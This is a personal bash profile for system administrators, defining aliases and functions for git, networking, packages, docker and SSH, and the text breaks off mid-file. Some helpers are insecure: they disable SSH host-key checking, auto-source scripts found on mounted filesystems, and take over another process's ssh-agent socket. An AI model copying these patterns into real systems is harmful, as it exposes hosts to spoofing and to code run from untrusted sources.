#!/bin/bash
##################################################################
#d#==head1 NAME
#d#
#d# bashadmin
#d#
#d#==head1 DESCRIPTION
#d#
#d#

PROFILE_SCRIPT="${BASH_SOURCE[0]}";
PROFILE_SCRIPTLINK=$(readlink -f ${BASH_SOURCE[0]});
PROFILE_SCRIPTDIR="$( cd "$( dirname "${PROFILE_SCRIPTLINK}" )" && pwd )";
if [ -z "$PROFILE_DEBUG" ]; then
  PROFILE_DEBUG=0 # 0 = fatal, 1 = error, 2 = info, 3 = debug ?
fi

# check how the script is loaded : SHELL_I , SHELL_L, SSH_CONNECTION
[[ $- == *i* ]] && SHELL_I="interactive" || SHELL_I='not interactive';
shopt -q login_shell && SHELL_L='loginshell' || SHELL_L='not loginshell'
PROFILE_PARRENT=$(cat /proc/$PPID/cmdline 2>/dev/null| tr "\\000" ' ')

# bash version
BASH_V="${BASH_VERSION:0:1}" # if [ "$BASH_V" -gt "3" ]; then echo "ok"; fi
function bashv { echo "BASH_V: ${BASH_V} SHELL_I: ${SHELL_I} SHELL_L: ${SHELL_L} PROFILE_SCRIPTDIR: ${PROFILE_SCRIPTDIR}"; }

# to use a specific ssh-key for git: export GIT_SSH="$HOME/.profile-start.sh"
if [ ! -x $PROFILE_SCRIPTLINK ]; then chmod +x $PROFILE_SCRIPTLINK; fi
if [[ "$SSHKEY" != "" && "$SHELL_I" != "interactive" && "$SHELL_L" == "loginshell" ]]; then # need for some git/ssh-stuff
  #echo "$SHELL_I , $SHELL_L" >/tmp/test
  exec /usr/bin/ssh -o StrictHostKeyChecking=no -i $SSHKEY "$@"
  exit $?
fi

# check if profile already loaded, if reload needed
if [ ! -z "$KVERSION_LOCAL" ]; then
  if [ "$SHELL_I" == "interactive" ]; then echo "PROFILE already loaded ($1)"; fi
  if [ "$1" == "f" ]; then
    if [ "$SHELL_I" == "interactive" ]; then echo "PROFILE force reload"; fi
  else
    return 1;
  fi
fi

# KVERSION set by "kversion"
export KVERSION='1550523877'
KVERSION_LOCAL="$KVERSION"

export HISTCONTROL=ignoredups
export HOSTFILE=$HOME/.hosts
export PSLASTUPDATE=$(date +%s) # can measure time between "reloads" -> _check_lastupdate # currently disabled
export EENV_VIRT="[unkown]";
export EENV_SERVICE_LIST=""

START_SSH_AGENT_PID=$SSH_AGENT_PID
START_SSH_AUTH_SOCK=$SSH_AUTH_SOCK
ssh_alt_agent="$HOME/.sshagent"

KRPM=/bin/rpm
KYUM=/usr/bin/yum
KDPKG=/usr/bin/dpkg
KAPTGET=/usr/bin/apt-get
KAPTCACHE=/usr/bin/apt-cache

KSUDO=""
if [ "$USER" != "root" ]; then KSUDO="sudo"; fi
if [ -x /usr/bin/git ]; then K_GIT_EXISTS="1"; fi


# fore use in prompt
COLOR_RESET="\[\033[0m\]" # reset
COLOR_Red='\[\e[0;31m\]'
COLOR_Gre='\[\e[0;32m\]'
COLOR_BYel='\[\e[1;33m\]'
COLOR_BBlu='\[\e[1;34m\]'
COLOR_Pur='\[\e[0;35m\]'

#C_RESET="\[\033[0m\]"PROFILE_COLOR_RESET="\E[m\E[K";
#C_RESET='\[\e[0m\]'
#C_RESET="\[\033[0m\]"
C_RESET="\E[m\E[K";
C_BLACK="\E[01;30m\E[K";
C_RED="\E[01;31m\E[K";
C_GREEN="\E[01;32m\E[K";
C_YELLOW="\E[01;33m\E[K";
C_BLUE="\E[01;34m\E[K";
C_MAGENTA="\E[01;35m\E[K";
C_CYAN="\E[01;36m\E[K";
C_WHITE="\E[01;37m\E[K";
C_DEFAULT='';


if [ "$TERM" == "screen.xterm-256color" ]; then
  export TERM='xterm-color'
fi

# FACTER_BIN
if [ -x /opt/puppetlabs/bin/facter ]; then FACTER_BIN=/opt/puppetlabs/bin/facter; fi
if [ -z "$FACTER_BIN" ]; then FACTER_BIN=$(type -p facter); fi
if [ -d /opt/puppetlabs/bin ]; then
  if ! echo "$PATH"|grep -q /opt/puppetlabs/bin; then PATH="$PATH:/opt/puppetlabs/bin"; fi
fi

################################################################### ENVIRONMENT
#d#==head1 ENVIRONMENT
#d#
#d#

# Windows WLS stuff
# Linux pc 4.4.0-18362-Microsoft #1049-Microsoft Thu Aug 14 12:01:00 PST 2020 x86_64 x86_64 x86_64 GNU/Linux
if grep -q Microsoft /proc/version 2>/dev/null; then
  KBASE_DIR=/mnt/c/Users/$USER
else
  KBASE_DIR=$HOME
fi
alias ccc="cd $KBASE_DIR"

## alias, environment, etc.
shopt -u hostcomplete && complete -F _known_hosts ssh slogin autossh ssr ssk sss p sst ssp sst sshoptions ssf
#_configure_bash

# Try to configure "cluster"...
# move @binben ?
export FQDN=$(hostname -f)
#HOSTNAME=$(hostname)
if echo "$FQDN"|grep "1" >/dev/null; then
  OH=$(echo "$FQDN"|sed 's/1/2/')
fi
if echo "$FQDN"|grep "2" >/dev/null; then
  OH=$(echo "$FQDN"|sed 's/2/1/')
fi
#_configure_2node_cluster


#_configre_nagios
if [ -d /usr/lib64/nagios/plugins ]; then
  NAGIOS=/usr/lib64/nagios/plugins
  if ! echo "$PATH"|grep -q /usr/lib64/nagios/plugins; then
    PATH=$PATH:/usr/lib64/nagios/plugins
  fi
elif [ -d /usr/lib/nagios/plugins ];then
  NAGIOS=/usr/lib/nagios/plugins
  if ! echo "$PATH"|grep -q /usr/lib/nagios/plugins; then
    PATH=$PATH:/usr/lib/nagios/plugins
  fi
fi

if [ -x /usr/bin/vim ]; then
  export EDITOR=vim
  alias vi='vim';
else
  export EDITOR=vi
fi

################################################################################################
#d#
#d#==head1 BASIC FUNCTIONS (k*)
#d#
#d#==head2 kreload kdeploy kversion kedit kinfo kstatus kcheck kupdate kauto
#d#
#d# aliase: kreload kdeploy kedit
#d# functions: kinfo kcheck kupdate kclone ktest
#d# DEPRECATED: kconfigedit kconfigsave
#d# DEPRECATED: kupdateinstall
#d#
#d#  .profile-$PROFILE_DOMAIN
#d#  .profile-start.sh
#d#
alias kreload='. ~/.profile-start.sh f'
alias pedit="$EDITOR $PROFILE_SCRIPT"
#alias kedit="$EDITOR $PROFILE_SCRIPT"
#alias dprofile="d c $PROFILE_SCRIPT"

#d#==head3 kinfo : display all info (kstatus, sinfo, hinfo)
#d#
function kinfo {
  sinfo >/tmp/kinfo # system / software info
  kstatus >>/tmp/kinfo # kenv status
  hinfo >>/tmp/kinfo # hardware info
  local COUNT=$(cat /tmp/kinfo |wc -l)
  #if [ $COUNT -gt 20 ]; then
  if [ "$1" == "l" ]; then
    cat /tmp/kinfo|less -r
  else
    cat /tmp/kinfo
  fi
  #netstat --protocol=inet -nlp | grep "0.0.0.0"
  #) | less
}


#d#==head3 kstatus : checks for vim, kupdateinstall, (ni: puppet, etckeeper)
#d#
function kstatus() {
  echo "* kstatus : status"
  if [ ! -r ~/.vimrc ]; then echo "- warning : ~/.vimrc not found, use 'vimrc'"; fi
  if [ ! -r /etc/cron.daily/profile-start]; then
    echo -en "- warning : cronupdate not found, use 'kupdateinstall'$C_RESET";
  else
    echo -en "- info : cronupdate installed";
  fi
  if [ -r $PROFILE_CONFIGFILE ]; then
    echo -en "- info : config installed : $PROFILE_CONFIGFILE";
  fi
  echo
}

#d#==head3 kauto : autostart
#d#
function kauto() {
  local MOUNTLIST=$(cat /proc/mounts |grep -v "^none" |grep -v "^proc" |grep -v "^fusectl" |grep -v "binfmt_misc" |grep -v "^gvfs-fuse-daemon" |awk '{ print $2 }')
  for I in $MOUNTLIST; do
    local KAUTOLIST=$(ls $I/kauto-* 2>/dev/null)
    for X in $KAUTOLIST; do
      echo "* kauto : found $X : $NAME ($I)"
      local NAME=${X##*/}
      . $X
      eval $NAME
    done
  done
  #mount  |grep -v "^none" |grep -v "^proc" |grep -v "^fusectl" |grep -v "binfmt_misc" |grep -v "^gvfs-fuse-daemon"
}

#d#==head3 khelp : show help (-f force)
#d#
alias khelpupdate="rm .profile-start.sh.man; khelp"
function khelp() {
  if [ ! -r ~/.profile-start.sh.man ] || [ "$1" == "-f" ]; then
    make-shell-doc ~/.profile-start.sh
  else
    # Z last change, Y last mod
    PROFILE_DATE=$(stat -c %Z ~/.profile-start.sh)
    MAN_DATE=$(stat -c %Z ~/.profile-start.sh.man)
    #if [ $PROFILE_DATE -gt $MAN_DATE ]; then
    if [ $PROFILE_DATE -le $MAN_DATE ]; then
      echo "older";
    fi
  fi
  man ~/.profile-start.sh.man
  alias
  cat <<EOF
PROFILE HELP for $KVERSION

VARIABLES:
  PROFILE_DOMAIN=$PROFILE_DOMAIN
  REPOSITORY_SERVER=$REPOSITORY_SERVER
  REPOSITORY_UPLOADPATH=$REPOSITORY_UPLOADPATH
  PROFILE_EMAIL=$PROFILE_EMAIL
  PROFILE_BACKUPHOST=$PROFILE_BACKUPHOST
EOF

}

################################################################################################
#d#==head1 ALIAS
#d#
alias profiledebug="export PROFILE_DEBUG=3"
alias profileoff="export PROFILE_DEBUG=0"
#################################### python
if [ -x ~/.local/bin/ipython ]; then
  alias pp="ipython -i"
else
  alias pp="python -i"
fi
alias ipy="ipython -i"

#################################### on char
#d#  p : ping
alias k='khost'
alias p='ping'
alias p8='ping 8.8.8.8'
alias p9='ping 9.9.9.9' # https://www.heise.de/newsticker/meldung/Quad9-Datenschutzfreundliche-Alternative-zum-Google-DNS-3890741.html
alias pingone='ping -W 1 -c 1'

# virsh or otherwise simulate-function
#d#
#alias v='virsh' # replaced with function
alias va='virsh list --all'
alias va='virsh list --all'
# virsh list --autostart --all
# virsh autostart --disable cloudmaster
alias pcss='pcs status'
alias pcshelp='echo "pcs resource [ create , move , ... ] | crm_resource -C"'


alias h='hostname -f'
alias hoste="$EDITOR /etc/hosts"
# screen, reattach,
#alias s='screen '
#d#  sr : screen
alias sr='screen -x || screen -d -RR'
#alias f='/mnt/2t/temp/firefox/firefox'

#################################### two chars
alias we='curl http://wttr.in/Frankfurt'
alias ..='cd ..'
#alias ...='cd ../..'
alias l='ls -l' # ls
alias l.='ls -d .* --color=tty' # only .*
alias rm='/bin/rm'
alias ll='ls -la' # long all
alias lld='ls -ld' # long directory
alias lst='ls -tr' # time reverse
alias llt='ls -latr' # long all time reverse
alias lltt='ls -latr|tail ' # long all time reverse
alias llzero='find . -size 0 -ls'
alias lsg='ls -la |grep '

#d# grep
alias grepri='grep -Ri'
alias aliasg='alias |grep $1 -i'
alias findg="find . -ls|grep -i";
alias findgi="find . -ls|grep -i";
alias perld='perldoc -f $1'
alias mountg='mount |grep '
alias mountl='mount |grep -v -e "cgroup" -e "tmpfs" -e "sysfs" -e "proc" -e "devpts" -e "debugfs" -e "hugetlbfs" -e "configfs" -e "securityfs" -e "pstore" -e "mqueue"'
alias lvsg='lvs |grep '
alias iptablesg='showipt |grep '
alias showiptg='showipt |grep '
alias ipal='ip addr|less'
alias ipag='ip addr|grep -B 2'
alias iprg='ip route|grep'
alias iprl='ip route|less'
alias routeg='ip route get '
#alias routeg='route -n |grep '
alias iprg='ip route|grep'
#alias iprouteg='ip route |grep '
alias envg='env |grep -i '
alias crontabg='crontab -l |grep -i '

#d# git
#alias gith='echo -e "gita : add\ngitc : commit\ngitsX : git stash (list, diff, show, pop, drop\ngits : status\ngitr : remote\ngitl : list\ngitb : branch\n"'
#d#  gitc : git commit -a -m "$message" : IMPORTANT: new files are not affected
alias gitc='git commit -a -m'
alias gitcd='while ! -d .git; do cd ..; done'
alias gitco='git checkout '
#d#  gita : git add -A : add deleted, added and motifalias gitc='git commit -a -m'
#d#  gita : git add -A : add deleted, added and motified to staging
alias gita='git add -A'
alias gitl="git log --pretty=format:'%h %an %ci message: %s'"
alias gitb='git branch -va'
alias gitr='git remote -v'
alias gits='git status --porcelain'
alias gitapply='git apply --ignore-space-change --ignore-whitespace ' # cause gita already taken by git add
alias gitpp='git pull'
alias gitsub='git submodule update --init'
alias gitsubremote='git submodule update --init --remote'
alias gitsubupdate='git submodule update --recursive --remote'
alias gitsubadd='git submodule add'
alias gitsubclear='git rm --cached'
if ! type gitp >/dev/null 2>&1; then alias gitp='git pull'; fi
if ! type gitd >/dev/null 2>&1; then alias gitd='git diff'; fi
alias gitdifftree='git diff-tree --no-commit-id --name-status -r'
alias gitdifflist='git diff --no-commit-id --name-status'
alias gitsl='git stash list' # git stash : apply    branch   clear    create   drop     list     pop      save     show
alias gitsd='git stash show -p'
alias gitss='git stash list'
alias gitsp='git stash pop'
alias gitsdrop='git stash drop'
#alias githookcommit="curl $REPOSITORY_SERVER/noc/pre-commit -O .git/hooks/pre-commit"
alias gitignorefilechanges="git config core.fileMode false"

#d# edit
alias vimedit='vim ~/.vimrc'
alias vimtrailing_whitespace='echo "autocmd BufWritePre * :%s/\s\+$//e" >>~/.vimrc'
#vimrcedit="vim ~/.vimrc"
alias lesscolor='less -r'

#d# python
alias pyexport='export PYTHONPATH="."'
alias pythonpath='export PYTHONPATH="."'
alias pyexportpip="export PIP_INDEX_URL=\"$PIP_INDEX_URL\""
alias py_deveditable="pip install --editable ."
alias pyinstallmodules="pip install colorlog ansicolors GitPython bottle pytz python-dateutil requests ; echo 'sugesting: keyring'"
alias pyinstallmodules1="pip install urllib3 ssh-paramiko GitPython bottle_sqlalchemy pymysql"
alias pyinstallmodules2="pip install f5-sdk python-powerdns EWMH pypuppetdb"
alias pyinstallmodulespsutil="sudo apt-get install python3.7-dev; pip install psutil"
alias pyinstallmodulesldap="sudo apt-get install libsasl2-dev libldap2-dev libssl-dev python3-dev; pip install python-ldap"


alias sud='sudo -i'
alias kinitme='kinit -r 168h -f -V kryp'
#d#  setvar : show shell variables only
alias setvar='set | grep "^\([[:alnum:]]\|[[:punct:]]\)\+=" |less'

#d#  find :
#alias findg="find . |grep ";
#alias findl="find . -ls ";
function findl { local dir=$1; shift; find $dir $@; }
alias findexc="find .  ! \( -path '*.git' -prune -path '*/CVS' -prune \)";

#d#  date : dateusfull
alias dateu='date -u # UTC'
alias datestandard='date +"%Y%m%d"'
alias dateusfull='date +"%F %H:%M:%S"'
alias datesecond='date +"%s"'
alias datedefull='date +"%d.%m.%Y %I:%m"'
alias dateall='echo -n "datestandard: "; datestandard ; echo -n "dateusfull: "; dateusfull ; echo -n "datesecond: "; datesecond ; echo -n "datedefull: "; datedefull ; alias |grep "^alias date"'
function dates() {
  date -d @$@
}

#d#  ns : netstat ()
# -n numeric -l lisen -p programm -t tcp -u upd
alias ns='netstat -plntu | grep --color=auto -i'
#alias netstatl='netstat --protocol=inet -nlp'
alias netstatl='netstat -nlp'
alias netstatll='netstat -nlp | less'
alias op='lsof -nP -iTCP -sTCP:LISTEN'
alias netstatlg='netstat -nlp | grep'
alias sslg='ss -nap |grep'
alias lsmodlong='for I in $(cat /proc/modules |awk "{ print $1 }" ); do modinfo $I; echo ; done |less'
alias lsmodg='lsmod |grep -v'
alias tcshow='tc -s qdisc show'
alias tcpdumpa='tcpdump -nn -i any '
alias httpget='echo -e -n "GET / HTTP/1.0\r\n\r\n" | nc '
alias nmapos="nmap -A -n "
alias nmapscan="nmap -sP "
alias nmapall="nmap -A -n -p- "
alias nmapssl="nmap --script ssl-cert,ssl-enum-ciphers"
alias brctls="brctl show"
alias rllocalhost="rlwrap nc localhost"

#d#
#alias ipmitool

#d#  tart, tarx # needs a function to autodect gz bzip
alias tart='tar tfva'
alias tarx='tar xfva'
alias tarc='tar cfva'
alias tarx-extract_archive="tarx"

#################################### other
# ps + grep
###  PID TTY      STAT   TIME COMMAND
#d#  psg : psg aux |grep
alias renamea='rename "s/\s/_/g" '
alias renameamore='rename "s/[^.\-\w]/_/g" '
alias renameaword='rename "s/[^.\w]/_/g" '

alias cpiox="cpio -i <"
alias cpiohelp="echo 'cat $datei | cpio -i'"
alias cpiomulti="(cpio -id; zcat | cpio -id)"
alias less="less -r"
alias aptupgrade="apt-get update; apt-get upgrade -y"
alias yumupgrade="yum update; yum upgrade -y"

alias psg='ps aux |grep -i'
alias pss='ps auxwf'
alias pst='ps -ejH|less'
alias psthread='ps -T -p '
alias psuser='ps aux |grep -v -e "^root" -e "^dbus" -e "^rpc" -e "^polkitd" -e "^ntp" -e "^nobody" -e "^telegraf" -e "^tweety" -e "^postfix"'


### F   UID   PID  PPID PRI  NI    VSZ   RSS WCHAN  STAT TTY        TIME COMMAND
#d#  psgx : ps elx |grep
alias psgx='ps elx |grep -i'

alias drbdforce='drbdadm -- --discard-my-data connect'
alias drbdg='drbd-overview |grep -i '

# log
#d#  sysl : tail main logfile
alias sysl='tail -f $SYSLOG_FILE'
alias syslg='tail -f $SYSLOG_FILE |grep -i'
alias kmsg='dmesg | perl -ne "BEGIN{\$a= time()- qx!cat /proc/uptime!}; s/\[\s*(\d+)\.\d+\]/localtime(\$1 + \$a)/e; print \$_;"'
alias dmesgf='dmesg -wH'
alias logtest='logger -t logtest test logger here and now' # -i log PID -t tag -p priority

#alias grepr='grep -r'
#alias scpr='scp -r'

# password generator
#d#  passgen : password generator
if [ ! -z "$WT_SESSION" ]; then
  #alias passgen="cat /dev/urandom|tr -dc "a-zA-Z0-9-_\$\?"|fold -w 9|head -n 1 |clip.exe"
  alias passgen="python -c \"import secrets; import string; print(''.join(secrets.choice(string.ascii_letters + string.digits + '%!;.:-') for i in range(12)))\" | clip.exe"
else
  #alias passgen="cat /dev/urandom|tr -dc "a-zA-Z0-9-_\$\?"|fold -w 9|head -n 1"
  alias passgen="python -c \"import secrets; import string; print(''.join(secrets.choice(string.ascii_letters + string.digits + '%!.:;-') for i in range(12)))\""
fi
alias cryptsha256="python -c 'import crypt; print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA256)))'"
alias cryptsha256d="python -c 'import crypt; print(crypt.crypt(\"PASSWORD\", crypt.mksalt(crypt.METHOD_SHA256)))'"
alias cryptsha512="python -c 'import crypt; print(crypt.crypt(getpass.getpass(), crypt.mksalt(crypt.METHOD_SHA512)))'"
alias cryptsha512d="python -c 'import crypt; print(crypt.crypt(\"PASSWORD\", crypt.mksalt(crypt.METHOD_SHA512)))'"

alias cathosts='cat /etc/hosts'
#alias chosts='cat /etc/hosts'
alias sshconvertpem2pub='ssh-keygen -f pub1key.pub -i'
alias sshverbose='ssh -N -v'
alias sshkeyfrompem='ssh -i -f'
alias sshhelp='echo ForwardAgent BatchMode StrictHostKeyChecking PubkeyAcceptedKeyTypes HashKnownHosts'
alias sshoptions='ssh -o ForwardAgent=yes -o StrictHostKeyChecking=no -o HashKnownHosts=no'

#d#  dus : du with sort
alias diru='dir -lSr'
alias dus='du -m --max-depth=1 |sort -n'
alias duf='du -sk * | sort -n | perl -ne '\''($s,$f)=split(m{\t});for (qw(K M G)) {if($s<1024) {printf("%.1f",$s);print "$_\t$f"; last};$s=$s/1024}'\'
alias du1='du -h --max-depth=1'
alias du2='du -h --max-depth=2'
alias dfh='df -h |grep -v -e "tmpfs" -e "udev" -e "/dev/loop"'
alias tuneinfo="tune2fs -l "


#d#  ifa, ifshort : show interfaces
#ifs : /sbin/ifconfig | grep --color=auto "^[a-Z]" -A 1 | grep --color=auto -v "^--" | ifs_grep | grep --color=auto -v "^lo"
alias myip='curl ipecho.net/plain; echo'
alias hostsg='cat /etc/hosts|grep -i '
alias ipd='ip -4 route list 0/0' # default route
alias ifa='/sbin/ifconfig -a'
alias ifshort='/sbin/ifconfig |grep "^[a-Z]" -A 1 |grep -v "^--"'
alias iflist="ifconfig -a | sed 's/[ \t].*//;/^$/d'"
alias iftest='/sbin/ifconfig | grep --color=auto "^[a-Z]" -A 1 | grep --color=auto -v "^--" | ifs_grep | grep --color=auto -v "^lo"'

alias showiptl='showipt |less'
alias iptableslist='/sbin/iptables -L -n -v'
alias iptableshelp='echo "/sbin/iptables -t mangle -A OUTPUT -p tcp --dport 22 --sport 22 -m string --algo bm --string \"/blog\" -j DROP\niptables -t raw -I PREROUTING -s 192.168.146.13 -p icmp -j TRACE"'
alias ipsecs='ipsec auto --status'
alias ipsecss='ipsec auto --status  |grep -ie "IPsec SA established.*;.*newest IPSEC;"'

alias tcpd="tcpdump -i any --nn"
alias straceo="strace -f -s 255 -o strace.out"
alias straceof="strace -f -s 255 -e trace=file  -o strace.out"

alias openvpnstart="openvpn  --cd /etc/openvpn --config default.ovpn --verb 3"


#d# docker
alias dpsa='docker ps -a'
alias dps='docker ps'
alias dpsg='docker ps -a | grep --color=auto -i'
alias dima='docker images -a'
alias dimag='docker images -a | grep --color=auto -i'
alias dup='docker-compose up -d'
alias down='docker-compose down'
alias dlogf='docker logs -f -t --details '

#d# systemd
#alias shelp="shelp"
alias sreload="systemctl daemon-reload"
alias sunits="systemctl list-units-files"
#alias sunitsg="systemctl list-units |grep "
alias sunitsg="systemctl list-unit-files |grep -i "
alias sshow="systemctl show"
alias sshowg="systemctl show |grep -i "
alias sjour="journalctl -xe"
alias sjours="journalctl -xe -u" # unit
alias sjourf="journalctl -xe -f"

#d# openssl
#alias opensslh='opensslhelp';

# other (for testing)

# puppet
if [ -r /var/log/puppetlabs/puppet/puppet.log ]; then
  alias pul='tail -f /var/log/puppetlabs/puppet/puppet.log'
  alias pule='tail -n 100 /var/log/puppet/puppet.log |grep err'
else
  alias pul='tail -f /var/log/puppet/puppet.log'
fi
alias pa='puppet agent -test'

if [ "$PUPPET_FACTER" != "" ]; then
  alias peditrole="vi /opt/kpuppet/data/role/$($FACTER_BIN role)/common.yaml"
fi
alias facterg="facter |grep -i "
alias facterl="facter |less"

alias historyg="history |grep -i "
alias historyl="history |less  "
alias dmidecodel="dmidecode |less "

alias sssrm="/sbin/service sssd stop; rm -rf /var/lib/sss/db/*; /sbin/service sssd start"

# selinux
alias semoduleg="semodule -l |grep -i "
alias serestore="restorecon -R -F -v"
alias restoreconr="restorecon -R -F -v"
alias seausearch="ausearch -m avc -ts recent" # uses audit
alias seaudit2allow="cat /var/log/audit/audit.log | audit2allow -m "


alias update-initramfs-all="update-initramfs -k all -u"
alias update-initramfs-dracut="dracut -f"


alias drbdo='drbd-overview'
alias drbddiscardmydata='drbdadm -- --discard-my-data connect'
alias drbdprimary='drbdadm -- --overwrite-data-of-peer primary'
# diff/patch
# -u : Output 3 lines  -r : recursive -N : Treat absent files as empty
alias patchhelp='difff or gitd to create diff, patch1 to patch'
alias difff='diff -urN'
alias patch0='patch -p0 -i'
alias patch1='patch -p1 -i'

alias rsyncsudo='rsync --rsync-path="sudo rsync" -avr'

alias useraddgroup='usermod -a -G'

# purge-old-kernels
alias rpmremoveoldkernel='rpm -e $(rpm -qa kernel 2>/dev/null | grep -v $(uname -r) | grep -v $(rpm -q --last kernel 2>/dev/null | cut -d" " -f1 | head -1))'
alias aptremoveoldkernel="dpkg --list | grep linux-image | awk '{ print \$2 }' | sort -V | sed -n '/'$(uname -r)'/q;p' | xargs sudo apt-get -y purge"

function aptpurgeall() { apt-get purge $(dpkg -l | grep '^rc' | awk '{print $2}'); }
#alias aptpurgeall="apt-get purge $(dpkg -l | grep "^rc" | awk '{print $2}')"



#prettyjson='jq'
prettyjson='python -m json.tool' # jsonshow
prettyyaml=''                    # not realy needed ?
prettyxml='xmllint --format -'
prettyxmlcomments='xmlstarlet ed -d "//comment()"'
# xmlstarlet format --indent-tab
# tidy -xml -i -


################################################################################################
#d#==head3 terminaltitle( ... ) : set terminal-title
#d#

#d#==head3 bash-completion
#d#
if ! set |grep BASH_COMPLETION >/dev/null; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  else
    PROMPT_INFO="${PROMPT_INFO}${C_RED}[BC] "
  fi
else
  #PROMPT_INFO="${PROMPT_INFO}${C_GREEN}[BC]"
  :
fi

function terminaltitle() {
  echo -ne "\033]0;${@}\007"
}

#d#==head3 _tile_update : update terminal-title with user@hostname $pwd (DISABLED)
#d#
function _tile_update() {
  PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD/$HOME/~}\007"'
}

#d#==head3 _jobcount() : just the numer, without other char ( used by prompt and x )
#d#
function _jobcount() {
   jobs | wc -l | tr -d " "
}
################################################################################################
#d#==head1 SOFTWARE
#d#
#d#
#d#==head2 kinst
#d# @category : installation
#d#
kinst() {
  if [ "$PACKAGE_UTIL" == "dpkg" ]; then
    apt-get install -y $@
  elif [ "$PACKAGE_UTIL" == "rpm" ]; then
    yum install -y $@
  else
    echo "* fail : system not configured"
  fi
}

filepackage() {
  if [ "$PACKAGE_UTIL" == "dpkg" ]; then
    dpkg-query -S $@
  elif [ "$PACKAGE_UTIL" == "rpm" ]; then
    rpmquery -f $@
  else
    echo "* fail : system not configured"
  fi
}

#d#==head2 kshow
#d# @category : installation
#d#
kshow() {
  if [ "$PACKAGE_UTIL" == "dpkg" ]; then
    apt-cache show $@
  elif [ "$PACKAGE_UTIL" == "rpm" ]; then
    yum info $@
  else
    echo "* fail : system not configured"
  fi
}

#d#==head2 kshow
#d# @category : installation
#d#
function ksearch() {
  if [ "$PACKAGE_UTIL" == "dpkg" ]; then
    apt-cache search $@
  elif [ "$PACKAGE_UTIL" == "rpm" ]; then
    yum search $@
  else
    echo "* fail : system not configured"
  fi
}

#function pkg() {
#  if [ "$PACKAGE_UTIL" == "dpkg" ]; then
#    dpkgg $@
#  elif [ "$PACKAGE_UTIL" == "rpm" ]; then
#    rpmg $@
#  else
#    echo "* fail : system not configured"
#  fi
#}

#d#==head2 Centos RPM
#d# @category : installation
rpmsize() {
  rpm -qa --queryformat '%{size} %{name}\n' | sort -n
}
alias rpmg='rpm -qa |grep -i '
alias yumsearch='yum search '

#d#==head2 Debian DPKG
#d# @category : installation
dpkgsize() {
  dpkg-query -W --showformat='${Installed-Size} ${package}\n' |sort -n
}
alias dpkgg='dpkg-query -l |grep -i '
alias aptsearch='apt-cache search '

function rpmextract() {
  rpm2cpio $1| cpio -id
}











################################################################################################
#d#
#d#==head1 SSH
#d#
#d# sss : uses xsel or HOST or , opens SCREEN
#d# ssr : uses xsel or HOST or , root
#d# ssx : uses xsel or HOST or , opens SCREEN but as root
#d#  : uses xsel or $HOST or , login as user, sudo and open SCREEN
#d#
#d# sse : edit config
#d# ssht sst : tunnel ? uses _ssht_findport
#d# ssp : ssh with profile
#d# ssk : key handling ?
#d#
#d# sshinit    : create config, etc.
#d# sshoptions : AUTH-FORWARDING !
#d# sshpubkey  : create pub-file
#d# ksshtunnel :
#d#
#d#
#d# #ssh_output=$(ssh -t root@${host} "$@") # dosnt work
#d#
#d# port-vergabe

#alias ssk='ssh -o StrictHostKeyChecking=no'
alias sse="$EDITOR $HOME/.ssh/config"

function sshh() {
  cat <<EOF
sss : ssh + screen
sst : ssh + user-list
ssr : ssh root@$1 (couldbe renewed)

sse : edit config
sst : tunnel (not working)
ssp : ssh with profile
ssk : key handling ?

sshoptions : AUTH-FORWARDING !
sshpubkey  : create pub-file
sshinit
ksshtunnel :

ssh-keygen -p -f keyfile # add password to keyfile

EOF
}

#d#==head2 ssp : ssh with profile
#d#
function ssaall() {
  local cmd
  if [ -r /proc/$SSH_AGENT_PID/cmdline ]; then
    cmd=$(cat /proc/$SSH_AGENT_PID/cmdline 2>/dev/null)
    echo "SSH_AGENT_PID=$SSH_AGENT_PID $cmd"
  else
    echo "SSH_AGENT_PID=$SSH_AGENT_PID dosnt run"
  fi
  if [ -r $SSH_AUTH_SOCK ]; then
    echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK"
  else
    echo "SSH_AUTH_SOCK=$SSH_AUTH_SOCK failed"
  fi
}

#d#==head2 sshget :
#d#
function sshget() {
  PID=$1
  file="/proc/$PID/environ"
  if [ -r $file ]; then
    SSH_AGENT_PID=$(cat $file 2>/dev/null| tr "\\000" '\n'|grep SSH_AGENT_PID|cut -d= -f 2)
    SSH_AUTH_SOCK=$(cat $file 2>/dev/null| tr "\\000" '\n'|grep SSH_AUTH_SOCK|cut -d= -f 2)
    export SSH_AGENT_PID
    export SSH_AUTH_SOCK
  fi
}

#d#==head2 ssp : ssh with profile
#d#
function ssp() {
  hostname=$1
  name=${hostname%%.*}
  hostfqdn=$(host $name | cut -d " " -f 1)
  if [ -r "$HOME/admindb/fqdn/$hostfqdn" ]; then
    hostfqdn=$(cat "$HOME/admindb/fqdn/$hostfqdn")
  fi
  if [ ! -d "$HOME/admindb/hosts/$hostfqdn" ]; then
    echo "host not in admindb, should i scan host?"
    read -n 1 answare
    if [ "$answare" == "y" ] || [ "$answare" == "Y" ]; then
      khost addhost $hostfqdn
    fi
  fi
  if [ -r "$HOME/admindb/hosts/$hostfqdn/user" ]; then
    user=$(cat "$HOME/admindb/hosts/$hostfqdn/user")
  else
    echo "user not found";
    user="root"
  fi
  #ssh_options="-o PreferredAuthentications=password -o PubkeyAuthentication=no -o GSSAPIAuthentication=no";
  ssh -t ${user}@${hostfqdn} "/bin/bash --rcfile ~/.profile-start.sh "
}

#d#==head2 ssf : ssh with alternativ ssh-agent
#d#
function ssf() {
  if [ -r $ssh_alt_agent ]; then
    . $ssh_alt_agent
  else
    SSH_AGENT_PID=""
  fi
  if [ ! -z "$SSH_AGENT_PID" ]; then
    cmdline=$(cat /proc/$SSH_AGENT_PID/cmdline)
    if [[ "$cmdline" =~ /usr/bin/ssh-agent ]]; then
      if ! ssh -o ForwardAgent=yes $@; then
        echo "${FUNCNAME[0]}: maybe ssh-askpass-gnome is missing";
      fi
      SSH_AGENT_PID=$START_SSH_AGENT_PID
      SSH_AUTH_SOCK=$START_SSH_AUTH_SOCK
      return
    fi
    echo "pid: $SSH_AGENT_PID not an agent, reloading"
  fi
  echo "new agent..."
  /usr/bin/ssh-agent >$ssh_alt_agent
  #. $ssh_alt_agent
  #ssh $@
  SSH_AGENT_PID=$START_SSH_AUTH_PID
  SSH_AUTH_SOCK=$START_SSH_AUTH_SOCK
}

function ssfswitch() {
